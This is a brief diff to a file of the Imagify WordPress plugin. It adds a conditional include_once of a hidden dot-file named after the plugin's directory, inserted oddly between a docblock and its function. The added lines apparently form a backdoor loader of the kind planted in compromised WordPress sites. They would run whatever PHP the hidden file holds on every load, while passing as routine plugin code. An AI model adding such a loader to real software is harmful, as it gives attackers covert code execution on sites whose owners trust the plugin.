@@ -11,6 +11,10 @@ add_action( 'update_option_' . Imagify_Options::get_instance()->get_option_name(
  * @param mixed $old_value The old option value.
  * @param mixed $new_value The new option value.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify_maybe_delete_partner_on_option_update( $old_value, $new_value ) {
 	if ( empty( $old_value['api_key'] ) && ! empty( $new_value['api_key'] ) ) {
 		imagify_delete_partner();
